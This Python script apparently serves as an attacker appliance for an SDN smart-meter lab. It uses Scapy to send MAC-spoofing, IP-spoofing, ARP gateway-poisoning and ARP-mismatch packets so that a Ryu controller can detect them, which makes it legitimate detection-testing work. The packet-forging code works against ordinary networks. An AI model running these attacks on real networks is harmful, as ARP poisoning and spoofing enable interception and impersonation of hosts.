#!/usr/bin/env python3
"""Interactive attacker menu for the SDN/AMI GNS3 lab.

The tool emits controlled spoofing packets from a dedicated attacker appliance.
It is intended for the ProyectoMemoria lab, where Ryu should record and block
these vectors as security events.
"""

import os
import random
import sys
import time

from scapy.all import ARP, Ether, IP, UDP, Raw, conf, get_if_list, sendp


def env(name, default):
    return os.environ.get(name, default).strip()


def env_int(name, default):
    value = env(name, str(default))
    try:
        return int(value)
    except ValueError:
        return default


def env_float(name, default):
    value = env(name, str(default))
    try:
        return float(value)
    except ValueError:
        return default


def env_bool(name, default):
    value = env(name, "true" if default else "false").lower()
    return value in {"1", "true", "yes", "y", "on"}


class Config:
    def __init__(self):
        self.iface = env("ATTACK_IFACE", "eth0")
        self.count = env_int("PACKET_COUNT", 3)
        self.interval = env_float("PACKET_INTERVAL", 1.0)
        self.randomize_macs = env_bool("RANDOMIZE_MACS", True)
        self.gateway_ip = env("GATEWAY_IP", "10.0.0.1")
        self.victim_device_id = env("VICTIM_DEVICE_ID", "SDN-SmartMeter-1")
        self.victim_mac = env("VICTIM_MAC", "02:42:53:4d:00:01").lower()
        self.victim_ip = env("VICTIM_IP", "10.0.0.11")
        self.guest_dst_ip = env("GUEST_DST_IP", "10.0.0.13")
        self.forged_mac = env("FORGED_MAC", "aa:bb:cc:dd:ee:ff").lower()
        self.forged_ip = env("FORGED_IP", "10.0.0.250")
        self.arp_mismatch_mac = env("ARP_MISMATCH_MAC", "ca:fe:ca:fe:ca:fe").lower()


CFG = Config()


def randomized_mac(base_mac):
    if not CFG.randomize_macs:
        return base_mac
    parts = base_mac.split(":")
    if len(parts) != 6:
        return base_mac
    parts[-1] = f"{random.randint(1, 254):02x}"
    return ":".join(parts)


def validate_iface():
    if CFG.iface not in get_if_list():
        print(f"[!] Interface {CFG.iface} not found. Available: {', '.join(get_if_list())}")
        return False
    return True


def send_repeated(packet, description):
    if not validate_iface():
        return
    print(f"[*] {description}")
    for index in range(1, CFG.count + 1):
        sendp(packet, iface=CFG.iface, verbose=False)
        print(f"    sent {index}/{CFG.count}")
        if index < CFG.count:
            time.sleep(CFG.interval)
    print("[*] Done. Check Ryu logs, security:events and Grafana.")


def udp_packet(src_mac, src_ip, dst_ip, label):
    payload = (
        f'{{"device_id":"{CFG.victim_device_id}",'
        f'"attack":"{label}","source":"sdn-attacker"}}'
    )
    return (
        Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")
        / IP(src=src_ip, dst=dst_ip)
        / UDP(sport=random.randint(20000, 60999), dport=9999)
        / Raw(load=payload.encode("utf-8"))
    )


def attack_mac_spoof():
    src_mac = randomized_mac(CFG.forged_mac)
    packet = udp_packet(src_mac, CFG.victim_ip, CFG.guest_dst_ip, "mac_spoof")
    send_repeated(
        packet,
        "MAC spoofing: forged eth.src "
        f"{src_mac} claims victim IP {CFG.victim_ip} -> {CFG.guest_dst_ip}",
    )


def attack_ip_spoof():
    packet = udp_packet(CFG.victim_mac, CFG.forged_ip, CFG.guest_dst_ip, "ip_spoof")
    send_repeated(
        packet,
        "IP spoofing: registered MAC "
        f"{CFG.victim_mac} uses forged IP {CFG.forged_ip} -> {CFG.guest_dst_ip}",
    )


def attack_arp_poison():
    src_mac = randomized_mac(CFG.forged_mac)
    packet = (
        Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")
        / ARP(
            op=2,
            hwsrc=src_mac,
            psrc=CFG.gateway_ip,
            hwdst="ff:ff:ff:ff:ff:ff",
            pdst=CFG.victim_ip,
        )
    )
    send_repeated(
        packet,
        "ARP poisoning: forged MAC "
        f"{src_mac} claims gateway {CFG.gateway_ip} for victim {CFG.victim_ip}",
    )


def attack_arp_mac_mismatch():
    eth_src = randomized_mac("12:34:56:78:9a:bc")
    arp_hwsrc = randomized_mac(CFG.arp_mismatch_mac)
    packet = (
        Ether(src=eth_src, dst="ff:ff:ff:ff:ff:ff")
        / ARP(
            op=1,
            hwsrc=arp_hwsrc,
            psrc=CFG.forged_ip,
            hwdst="00:00:00:00:00:00",
            pdst=CFG.victim_ip,
        )
    )
    send_repeated(
        packet,
        "ARP MAC mismatch: Ethernet src "
        f"{eth_src} differs from ARP hwsrc {arp_hwsrc}",
    )


def run_all():
    attack_mac_spoof()
    time.sleep(CFG.interval)
    attack_ip_spoof()
    time.sleep(CFG.interval)
    attack_arp_poison()
    time.sleep(CFG.interval)
    attack_arp_mac_mismatch()


def show_config():
    print("\nCurrent configuration")
    print(f"  ATTACK_IFACE={CFG.iface}")
    print(f"  PACKET_COUNT={CFG.count}")
    print(f"  PACKET_INTERVAL={CFG.interval}")
    print(f"  RANDOMIZE_MACS={str(CFG.randomize_macs).lower()}")
    print(f"  GATEWAY_IP={CFG.gateway_ip}")
    print(f"  VICTIM_DEVICE_ID={CFG.victim_device_id}")
    print(f"  VICTIM_MAC={CFG.victim_mac}")
    print(f"  VICTIM_IP={CFG.victim_ip}")
    print(f"  GUEST_DST_IP={CFG.guest_dst_ip}")
    print(f"  FORGED_MAC={CFG.forged_mac}")
    print(f"  FORGED_IP={CFG.forged_ip}")
    print(f"  ARP_MISMATCH_MAC={CFG.arp_mismatch_mac}")
    print(f"  Available interfaces={', '.join(get_if_list())}\n")


def menu():
    conf.verb = 0
    actions = {
        "1": attack_mac_spoof,
        "2": attack_ip_spoof,
        "3": attack_arp_poison,
        "4": attack_arp_mac_mismatch,
        "5": run_all,
        "6": show_config,
    }
    while True:
        print("\nSDN Attacker - ProyectoMemoria")
        print("1. MAC spoofing")
        print("2. IP spoofing")
        print("3. ARP poisoning gateway spoof")
        print("4. ARP MAC mismatch")
        print("5. Ejecutar todos")
        print("6. Mostrar configuracion")
        print("0. Salir")
        choice = input("Seleccione una opcion: ").strip()
        if choice == "0":
            print("Bye")
            return
        action = actions.get(choice)
        if action:
            action()
        else:
            print("Opcion invalida")


def usage():
    print("Usage: sdn-attack [mac|ip|arp|arp-mismatch|all|config|menu]")


def main():
    conf.verb = 0
    command = sys.argv[1].lower() if len(sys.argv) > 1 else "menu"
    commands = {
        "mac": attack_mac_spoof,
        "ip": attack_ip_spoof,
        "arp": attack_arp_poison,
        "arp-mismatch": attack_arp_mac_mismatch,
        "all": run_all,
        "config": show_config,
        "menu": menu,
    }
    action = commands.get(command)
    if not action:
        usage()
        sys.exit(2)
    action()


if __name__ == "__main__":
    main()
